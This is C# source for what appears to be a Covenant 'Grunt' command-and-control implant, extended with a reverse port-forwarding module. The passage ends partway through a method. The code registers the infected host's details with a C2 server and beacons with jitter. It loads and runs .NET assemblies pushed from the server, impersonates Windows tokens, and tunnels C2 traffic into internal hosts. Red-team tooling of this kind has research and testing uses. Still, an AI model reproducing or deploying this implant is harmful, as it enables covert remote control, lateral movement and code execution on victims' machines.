using System;
using System.Net;
using System.Linq;
using System.Text;
using System.IO;
using System.IO.Pipes;
using System.IO.Compression;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using Microsoft.CSharp;
using System.Net.Sockets;
using System.Security.Policy;


namespace GruntExecutor
{
    class Grunt
    {
        public static class Portfwd

        //Reverse Port Forward by Thiago Mayllart

        {

            public static Dictionary<string, bool> states = new Dictionary<string, bool>();
            public static Dictionary<string, List<Socket>> target_sockets = new Dictionary<string, List<Socket>>();
            public static Dictionary<string, List<Socket>> c2_sockets = new Dictionary<string, List<Socket>>();
            public static Dictionary<string, Thread> portfwds = new Dictionary<string, Thread>();
            public static Dictionary<string, List<string>> info_list = new Dictionary<string, List<string>>();
            public static Dictionary<string, byte[]> Data = new Dictionary<string, byte[]>();

            public class Byte_Data
            {
                public byte[] data_to_send;
                public int size_of_data;
                public Byte_Data(byte[] data, int size)
                {
                    this.data_to_send = data;
                    this.size_of_data = size;
                }
            }

            public class handleClient
            {
                Socket sockC2;
                Socket sockTarget;
                string bind_port;

                public List<byte[]> bytesFromC2 = new List<byte[]>();
                bool bytesFromC2_lock = false;
                public List<Byte_Data> bytesFromTarget = new List<Byte_Data>();
                bool bytesFromTarget_lock = false;
                public List<byte[]> bytesToC2 = new List<byte[]>();
                bool bytesToC2_lock = false;
                public List<byte[]> bytesToTarget = new List<byte[]>();
                bool bytesToTarget_lock = false;
                IPEndPoint remotetarget;

                bool targetslock = false;

                public void startClient(Socket sockC2, Socket sockTarget, string bind_port, IPEndPoint remote_target)
                {
                    this.sockC2 = sockC2;
                    this.sockTarget = sockTarget;
                    this.bind_port = bind_port;
                    this.remotetarget = remote_target;
                    Thread ctThread = new Thread(() => doChat(bind_port, sockC2, sockTarget, remote_target));
                    ctThread.Start();
                }



                public void asyncRead(Socket socket, int id, string bind_port)
                {
                    String from = "";
                    if (id == 0)
                    {
                        from = "C2";
                    }
                    else
                    {
                        from = "target";
                    }
                    var data = new byte[8192];
                    while (states[bind_port] == true)
                    {
                        try
                        {
                            if (id == 0)
                            {
                                if (bytesFromC2.Count == 10)
                                {
                                    System.Threading.Thread.Sleep(5000);
                                }
                                else
                                {
                                    data = new byte[4];
                                    int i = socket.Receive(data, 4, SocketFlags.None);
                                    int length = BitConverter.ToInt32(data, 0);
                                    byte[] body = new byte[length];
                                    int offset = 0;
                                    while (length > 0)
                                    {
                                        int ret = socket.Receive(body, offset, length, SocketFlags.None);
                                        if (ret > 0)
                                        {
                                            offset += ret;
                                            length -= ret;
                                        }
                                        else
                                        {
                                            break;
                                        }
                                    }
                                    bytesFromC2.Add(body);
                                }
                            }
                            if (id == 1)
                            {
                                if (bytesFromTarget.Count == 10)
                                {
                                    System.Threading.Thread.Sleep(1000);
                                }
                                else
                                {
                                    data = new byte[8192];
                                    int size_data = socket.Receive(data);
                                    bytesFromTarget.Add(new Byte_Data(data.Take(size_data).ToArray(), size_data));


                                }
                            }
                        }
                        catch (Exception e)
                        {
                            break;
                        }
                    }
                    try
                    {
                        socket.Shutdown(SocketShutdown.Both);
                        socket.Close();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message + e.StackTrace);
                    }
                }

                public void asyncWrite(Socket socket, int id, string bind_port)
                {
                    while (states[bind_port] == true)
                    {
                        try
                        {
                            if (id == 0)
                            {
                                if (bytesFromC2.ToList().Any())
                                {

                                    socket.Send(bytesFromC2[0]);
                                    bytesFromC2.RemoveAt(0);
                                }
                                else
                                {
                                    System.Threading.Thread.Sleep(1000);
                                }
                            }
                            if (id == 1)
                            {
                                if (bytesFromTarget.ToList().Any())
                                {
                                    socket.Send(BitConverter.GetBytes(bytesFromTarget[0].size_of_data));
                                    socket.Send(bytesFromTarget[0].data_to_send);
                                    bytesFromTarget.RemoveAt(0);

                                }
                                else
                                {
                                    System.Threading.Thread.Sleep(1000);
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            break;
                        }
                    }
                    try
                    {
                        socket.Shutdown(SocketShutdown.Both);
                        socket.Close();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message + e.StackTrace);
                    }
                }

                public void doChat(string bind_port, Socket sock_c2, Socket sock_target, IPEndPoint remote_target)
                {
                    Thread keep_reading_from_C2 = new Thread(() => asyncRead(sock_c2, 0, bind_port));
                    Thread keep_writing_to_Target = new Thread(() => asyncWrite(sock_target, 0, bind_port));
                    Thread keep_reading_from_Target = new Thread(() => asyncRead(sock_target, 1, bind_port));
                    Thread keep_writing_to_C2 = new Thread(() => asyncWrite(sock_c2, 1, bind_port));
                    try
                    {
                        keep_reading_from_C2.Start();
                        System.Threading.Thread.Sleep(1000);
                        keep_writing_to_Target.Start();
                        System.Threading.Thread.Sleep(1000);
                        keep_reading_from_Target.Start();
                        System.Threading.Thread.Sleep(1000);
                        keep_writing_to_C2.Start();
                        while ((true))
                        {
                            try
                            {
                                int result1 = sock_c2.Available;
                            }
                            catch (Exception ef)
                            {
                                keep_reading_from_C2.Abort();
                                keep_reading_from_C2 = null;
                                keep_writing_to_Target.Abort();
                                keep_writing_to_Target = null;
                                keep_reading_from_Target.Abort();
                                keep_reading_from_Target = null;
                                keep_writing_to_C2.Abort();
                                keep_writing_to_C2 = null;
                                sock_target.Shutdown(SocketShutdown.Both);
                                sock_target.Close();
                                sock_c2.Shutdown(SocketShutdown.Both);
                                sock_c2.Close();
                                break;
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Threads Bug");

                    }
                }
            }


            public static void handleData(string c2_ip, string bind_port, string target_port, string target_ip, string rand_port)
            {
                try
                {
                    bool shouldcontinue = true;
                    states[bind_port] = true;
                    Socket socketC2 = null;
                    Socket socketTarget = null;

                    while (states[bind_port])
                    {
                        try
                        {
                            var c2_ip_p = IPAddress.Parse(c2_ip);
                            IPEndPoint remoteEPC2 = new IPEndPoint(c2_ip_p, Convert.ToInt32(rand_port));

                            // Create a TCP/IP  socket.  
                            socketC2 = new Socket(c2_ip_p.AddressFamily,
                                SocketType.Stream, ProtocolType.Tcp);
                            socketC2.Connect(remoteEPC2);
                            String code_to_start = "testingcode";
                            socketC2.Send(Encoding.UTF8.GetBytes(code_to_start));
                            byte[] data_aux = new byte[256];
                            byte[] data = new byte[256];
                            socketC2.Receive(data);
                            c2_sockets[bind_port].Add(socketC2);
                            var target_ip_p = IPAddress.Parse(target_ip);
                            IPEndPoint remoteTarget = new IPEndPoint(target_ip_p, Convert.ToInt32(target_port));

                            socketTarget = new Socket(target_ip_p.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                            socketTarget.Connect(remoteTarget);
                            target_sockets[bind_port].Add(socketTarget);
                            handleClient client = new handleClient();
                            client.startClient(socketC2, socketTarget, bind_port, remoteTarget);
                        }
                        catch (Exception ef)
                        {
                            Console.WriteLine(ef.Message + ef.StackTrace);
                        }
                    }
                    socketC2.Shutdown(SocketShutdown.Both);
                    socketC2.Close();
                    socketTarget.Shutdown(SocketShutdown.Both);
                    socketTarget.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }


            }

            public static string AddPortForward(string ip, string bind_port, string target_port, string target_ip, string rand_port)
            {
                List<Socket> targets = new List<Socket>();
                List<Socket> c2s = new List<Socket>();
                c2_sockets[bind_port] = c2s;
                target_sockets[bind_port] = targets;
                Thread ctThread = new Thread(() => handleData(ip, bind_port, target_port, target_ip, rand_port));
                ctThread.Start();
                portfwds[bind_port] = ctThread;
                info_list[bind_port] = new List<string>(new string[] { "[+]", bind_port, target_ip, target_port });
                return ShowReversePortForwwrds();
            }

            public static string DelPortForward(string data, string bind_port)
            {
                try
                {
                    states[bind_port] = false;
                    info_list.Remove(bind_port);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
                foreach (Socket sc in c2_sockets[bind_port])
                {
                    try
                    {
                        sc.Shutdown(SocketShutdown.Both);
                        sc.Close();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
                foreach (Socket sc2 in target_sockets[bind_port])
                {
                    try
                    {
                        sc2.Shutdown(SocketShutdown.Both);
                        sc2.Close();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
                try
                {
                    portfwds[bind_port].Abort();
                }
                catch (Exception e)
                {

                }
                return ShowReversePortForwwrds();
            }

            public static string FlushPortForward()
            {
                var keys = new List<string>(states.Keys);
                foreach (string key in keys)
                {
                    states[key] = false;
                }

                var keys2 = new List<string>(states.Keys);
                foreach (string key in keys2)
                {
                    try
                    {
                        portfwds[key].Abort();
                    }
                    catch (Exception e)
                    {

                    }
                }

                var keys3 = new List<string>(info_list.Keys);
                foreach (string key in keys3)
                {
                    info_list.Remove(key);
                }

                var keys4 = new List<string>(c2_sockets.Keys);
                foreach (string key in keys4)
                {
                    try
                    {
                        foreach (Socket sc in c2_sockets[key])
                        {
                            sc.Shutdown(SocketShutdown.Both);
                            sc.Close();
                        }
                    }
                    catch (Exception e)
                    {

                    }
                }

                var keys5 = new List<string>(target_sockets.Keys);
                foreach (string key in keys5)
                {
                    try
                    {
                        foreach (Socket sc2 in target_sockets[key])
                        {
                            sc2.Shutdown(SocketShutdown.Both);
                            sc2.Close();
                        }
                    }
                    catch (Exception e)
                    {

                    }
                }
                return "Flushed Reverse Port Forward";
            }

            public static string ShowReversePortForwwrds()
            {
                List<String> results = new List<String>();
                var keys = new List<string>(info_list.Keys);
                foreach (string key in keys)
                {
                    List<String> ls;
                    ls = info_list[key];
                    string s = string.Join(" ", ls.ToArray());
                    results.Add(s);
                }
                string final_result = string.Join("\r\n", results.ToArray());
                return final_result;
            }


            public static bool DummyMethod()
            {
                return true;
            }

            public static String dealwithit(String Command)
            {

                string output = "";
                try
                {

                    TextWriter realStdOut = Console.Out;
                    TextWriter realStdErr = Console.Error;
                    TextWriter stdOutWriter = new StringWriter();
                    TextWriter stdErrWriter = new StringWriter();
                    Console.SetOut(stdOutWriter);
                    Console.SetError(stdErrWriter);

                    if (Command.Contains(' '))
                    {
                        int index = Command.IndexOf(' ');
                        string comm = Command.Substring(0, index);
                        string func = Command.Substring(index + 1);
                        string[] commands = func.Split(' ');
                        string bind_port;
                        string ip;
                        string target_port;
                        string target_ip;
                        string random_port;
                        switch (comm)
                        {
                            case "list":
                                output += ShowReversePortForwwrds();
                                break;
                            case "start":
                                bind_port = commands[1];
                                ip = commands[0];
                                target_port = commands[3];
                                target_ip = commands[2];
                                random_port = commands[4];
                                output += AddPortForward(ip, bind_port, target_port, target_ip, random_port);
                                break;
                            case "stop":
                                bind_port = commands[0];
                                output += DelPortForward(func, bind_port);
                                break;
                            case "flush":
                                output += FlushPortForward();
                                break;
                            case "help":
                                output += "[+] Usage: \r\n";
                                output += "[+] list\r\n";
                                output += "[+] Returns a list of current reverse port forwards.\r\n\r\n";



                                output += "[+] start\r\n";
                                output += "[+] Starts a new reverse port forward.\r\n";
                                output += "[+] start [bind port] [forward host] [forward port] [ip_to_allow_connections]\r\n";

                                output += "[+] Stop\r\n";
                                output += "[+] Stops an existing reverse port forward.\r\n";
                                output += "[+] stop [bind port]\r\n";

                                output += "[+] flush\r\n";
                                output += "[+] Flush all reverse port forwards on an Agent.\r\n";
                                break;
                            default:
                                output += "[+] Usage:\r\n ";
                                output += "[+] list \r\n";
                                output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";



                                output += "[+] start \r\n";
                                output += "[+] Starts a new reverse port forward.\r\n";
                                output += "[+] start [bind port] [forward host] [forward port]\r\n\r\n";

                                output += "[+] Stop\r\n";
                                output += "[+] Stops an existing reverse port forward.\r\n";
                                output += "[+] stop [bind port]\r\n\r\n";

                                output += "[+] flush";
                                output += "[+] Flush all reverse port forwards on an Agent.\r\n";
                                break;


                        }
                    }
                    else
                    {
                        output += "[+] Usage: \r\n";
                        output += "[+] list \r\n";
                        output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";



                        output += "[+] start \r\n";
                        output += "[+] Starts a new reverse port forward. \r\n";
                        output += "[+] start [bind port] [forward host] [forward port] \r\n\r\n";

                        output += "[+] Stop \r\n";
                        output += "[+] Stops an existing reverse port forward. \r\n";
                        output += "[+] stop [bind port] \r\n\r\n";

                        output += "[+] flush \r\n";
                        output += "[+] Flush all reverse port forwards on an Agent. \r\n";
                    }

                    Console.Out.Flush();
                    Console.Error.Flush();
                    Console.SetOut(realStdOut);
                    Console.SetError(realStdErr);

                    output += stdOutWriter.ToString();
                    output += stdErrWriter.ToString();


                    return output;
                }
                catch (Exception e)
                {
                    output += e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; Console.WriteLine(e.Message);
                    return output;
                }
            }
        }

        public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
        {
            try
            {
                int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
				List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
				List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");

                string Hostname = Dns.GetHostName();
                string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        IPAddress = a.ToString();
                        break;
                    }
                }
                string OperatingSystem = Environment.OSVersion.ToString();
                string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                int Integrity = 2;
                if (Environment.UserName.ToLower() == "system")
                {
                    Integrity = 4;
                }
                else
                {
                    var identity = WindowsIdentity.GetCurrent();
                    if (identity.Owner != identity.User)
                    {
                        Integrity = 3;
                    }
                }
                string UserDomainName = Environment.UserDomainName;
                string UserName = Environment.UserName;

                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                IMessenger baseMessenger = null;
                baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
                baseMessenger.Read();
                baseMessenger.Identifier = GUID;
                TaskingMessenger messenger = new TaskingMessenger
                (
                    new MessageCrafter(GUID, SessionKey),
                    baseMessenger,
                    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
                );
                messenger.QueueTaskingMessage(RegisterBody);
                messenger.WriteTaskingMessage();
                messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
                try
                {
                    // A blank upward write, this helps in some cases with an HTTP Proxy
                    messenger.QueueTaskingMessage("");
                    messenger.WriteTaskingMessage();
                }
                catch (Exception) { }
                
                List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
                WindowsImpersonationContext impersonationContext = null;
                Random rnd = new Random();
                int ConnectAttemptCount = 0;
                bool alive = true;
                while (alive)
                {
                    int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
                    if (rnd.Next(2) == 0) { change = -change; }
                    Thread.Sleep((Delay + change) * 1000);
                    try
                    {
                        GruntTaskingMessage message = messenger.ReadTaskingMessage();
                        if (message != null)
                        {
                            ConnectAttemptCount = 0;
                            string output = "";
                            if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
                            {
                                if (int.TryParse(message.Message, out int val))
                                {
                                    if (message.Type == GruntTaskingType.SetDelay)
                                    {
                                        Delay = val;
                                        output += "Set Delay: " + Delay;
                                    }
                                    else if (message.Type == GruntTaskingType.SetJitter)
                                    {
                                        Jitter = val;
                                        output += "Set Jitter: " + Jitter;
                                    }
                                    else if (message.Type == GruntTaskingType.SetConnectAttempts)
                                    {
                                        ConnectAttempts = val;
                                        output += "Set ConnectAttempts: " + ConnectAttempts;
                                    }
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message;
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Type == GruntTaskingType.SetKillDate)
                            {
                                if (DateTime.TryParse(message.Message, out DateTime date))
                                {
                                    KillDate = date;
                                    output += "Set KillDate: " + KillDate.ToString();
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message;
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Type == GruntTaskingType.Exit)
                            {
                                output += "Exited";
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                                messenger.WriteTaskingMessage();
                                return;
                            }
                            else if(message.Type == GruntTaskingType.Tasks)
                            {
                                if (!Tasks.Where(T => T.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                else
                                {
                                    output += "Task       Status" + Environment.NewLine;
                                    output += "----       ------" + Environment.NewLine;
                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if(message.Type == GruntTaskingType.TaskKill)
                            {
                                var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
                                if (!matched.Any())
                                {
                                    output += "No active task with name: " + message.Message;
                                }
                                else
                                {
                                    KeyValuePair<string, Thread> t = matched.First();
                                    t.Value.Abort();
                                    Thread.Sleep(3000);
                                    if (t.Value.IsAlive)
                                    {
                                        t.Value.Suspend();
                                    }
                                    output += "Task: " + t.Key + " killed!";
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Token)
                            {
                                if (impersonationContext != null)
                                {
                                    impersonationContext.Undo();
                                }
                                IntPtr impersonatedToken = IntPtr.Zero;
                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message, Delay));
                                t.Start();
                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                                bool completed = t.Join(5000);
                                if (completed && impersonatedToken != IntPtr.Zero)
                                {
                                    try
                                    {
                                        WindowsIdentity identity = new WindowsIdentity(impersonatedToken);
                                        impersonationContext = identity.Impersonate();
                                    }
                                    catch (ArgumentException) { }
                                }
                                else
                                {
                                    impersonationContext = null;
                                }
                            }
                            else
                            {
                                Thread t = new Thread(() => TaskExecute(messenger, message, Delay));
                                t.Start();
                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                            }
                        }
                        messenger.WriteTaskingMessage();
                    }
                    catch (ObjectDisposedException e)
                    {
                        ConnectAttemptCount++;
                        messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "").ToJson());
                        messenger.WriteTaskingMessage();
                    }
                    catch (Exception e)
                    {
                        ConnectAttemptCount++;
                        Console.Error.WriteLine("Loop Exception: " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                    if (ConnectAttemptCount >= ConnectAttempts) { return; }
                    if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)
        {
            const int MAX_MESSAGE_SIZE = 1048576;
            string output = "";
            try
            {
                if (message.Type == GruntTaskingType.Assembly)
                {
                    string[] pieces = message.Message.Split(',');
                    if (pieces.Length > 0)
                    {
                        string[] parameters = null;
                        if (pieces.Length > 1) { parameters = new string[pieces.Length - 1]; }
                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                        byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                        byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                        Assembly gruntTask = Assembly.Load(decompressedBytes);
                        PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
                        string results = "";
                        object objTask = new object();
                        var myMethodExists = gruntTask.GetType("Task").GetMethod("DummyPortFwd");

                        if (streamProp == null)
                        {
                            results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                        }
                        else
                        {
                            if (myMethodExists != null)
                            {
                                string params_str = string.Join("", parameters);
                                results = Portfwd.dealwithit(params_str);
                                if (results != null) { output += (string)results; }
                            }
                            else
                            {
                                Thread invokeThread = new Thread(() => results = (string)gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
                                using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
                                {
                                    using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
                                    {
                                        streamProp.SetValue(null, pipeClient, null);
                                        DateTime lastTime = DateTime.Now;
                                        invokeThread.Start();
                                        using (StreamReader reader = new StreamReader(pipeServer))
                                        {
                                            object synclock = new object();
                                            string currentRead = "";
                                            Thread readThread = new Thread(() =>
                                            {
                                                int count;
                                                char[] read = new char[MAX_MESSAGE_SIZE];
                                                while ((count = reader.Read(read, 0, read.Length)) > 0)
                                                {
                                                    lock (synclock)
                                                    {
                                                        currentRead += new string(read, 0, count);
                                                    }
                                                }
                                            });
                                            readThread.Start();
                                            while (readThread.IsAlive)
                                            {
                                                Thread.Sleep(Delay * 1000);
                                                lock (synclock)
                                                {
                                                    try
                                                    {
                                                        if (currentRead.Length >= MAX_MESSAGE_SIZE)
                                                        {
                                                            for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
                                                            {
                                                                string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
                                                                try
                                                                {
                                                                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
                                                                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                                                                }
                                                                catch (Exception) { }
                                                            }
                                                            currentRead = "";
                                                            lastTime = DateTime.Now;
                                                        }
                                                        else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
                                                        {
                                                            GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
                                                            messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                                                            currentRead = "";
                                                            lastTime = DateTime.Now;
                                                        }
                                                    }
                                                    catch (ThreadAbortException) { break; }
                                                    catch (Exception) { currentRead = ""; }
                                                }
                                            }
                                            output += currentRead;
                                        }
                                    }
                                }
                                invokeThread.Join();
                            }
                        }
                        output += results;
                    }
                }
                else if (message.Type == GruntTaskingType.Connect)
                {
                    string[] split = message.Message.Split(',');
                    bool connected = messenger.Connect(split[0], split[1]);
                    output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                          "Connection to " + split[0] + ":" + split[1] + " failed.";
                }
                else if (message.Type == GruntTaskingType.Disconnect)
                {
                    bool disconnected = messenger.Disconnect(message.Message);
                    output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
                }
            }
            catch (Exception e)
            {
                try
                {
                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                }
                catch (Exception) { }
            }
            finally
            {
                for (int i = 0; i < output.Length; i += MAX_MESSAGE_SIZE)
                {
                    string aRead = output.Substring(i, Math.Min(MAX_MESSAGE_SIZE, output.Length - i));
                    try
                    {
                        GruntTaskingStatus status = i + MAX_MESSAGE_SIZE < output.Length ? GruntTaskingStatus.Progressed : GruntTaskingStatus.Completed;
                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(status, aRead);
                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                    }
                    catch (Exception) {}
                }
                if (string.IsNullOrEmpty(output))
                {
                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "");
                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                }
            }
            return WindowsIdentity.GetCurrent().Token;
        }
    }

    public enum MessageType
    {
        Read,
        Write
    }

    public class ProfileMessage
    {
        public MessageType Type { get; set; }
        public string Message { get; set; }
    }

    public class MessageEventArgs : EventArgs
    {
        public string Message { get; set; }
    }

    public interface IMessenger
    {
        string Hostname { get; }
        string Identifier { get; set; }
        string Authenticator { get; set; }
        EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
        ProfileMessage Read();
        void Write(string Message);
        void Close();
    }

    public class Profile
    {
        private string GetResponse { get; }
        private string PostRequest { get; }
        private string PostResponse { get; }

        public Profile(string GetResponse, string PostRequest, string PostResponse)
        {
            this.GetResponse = GetResponse;
            this.PostRequest = PostRequest;
            this.PostResponse = PostResponse;
        }

        public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
        public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
        public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
        public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }
        public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }
        public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }

        private static GruntEncryptedMessage Parse(string Format, string Message)
        {
            string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(
                Utilities.Parse(Message, Format)[0]
            ));
            if (json == null || json.Length < 3)
            {
                return null;
            }
            return GruntEncryptedMessage.FromJson(json);
        }

        private static string Format(string Format, GruntEncryptedMessage Message)
        {
            return String.Format(Format,
                Utilities.MessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
            );
        }
    }

    public class TaskingMessenger
    {
        private object _UpstreamLock = new object();
        private IMessenger UpstreamMessenger { get; set; }
        private object _MessageQueueLock = new object();
        private Queue<string> MessageQueue { get; } = new Queue<string>();

        private MessageCrafter Crafter { get; }
        private Profile Profile { get; }

        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();

        public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)
        {
            this.Crafter = Crafter;
            this.UpstreamMessenger = Messenger;
            this.Profile = Profile;
            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
                this.QueueTaskingMessage(e.Message);
                this.WriteTaskingMessage();
            };
        }

        public GruntTaskingMessage ReadTaskingMessage()
        {
            ProfileMessage readMessage = null;
            lock (_UpstreamLock)
            {
                readMessage = this.UpstreamMessenger.Read();
            }
            if (readMessage == null)
            {
                return null;
            }
            GruntEncryptedMessage gruntMessage = null;
            if (readMessage.Type == MessageType.Read) 
            {
                gruntMessage = this.Profile.ParseGetResponse(readMessage.Message);
            }
            else if (readMessage.Type == MessageType.Write)
            {
                gruntMessage = this.Profile.ParsePostResponse(readMessage.Message);
            }
            if (gruntMessage == null)
            {
                return null;
            }
            else if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                return (json == null || json == "") ? null : GruntTaskingMessage.FromJson(json);
            }
            else
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
                IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
                if (relay != null)
                {
                    relay.Write(this.Profile.FormatGetResponse(wrappedMessage));
                }
                return null;
            }
        }

        public void QueueTaskingMessage(string Message, string Meta = "")
        {
            GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
            string uploaded = this.Profile.FormatPostRequest(gruntMessage);
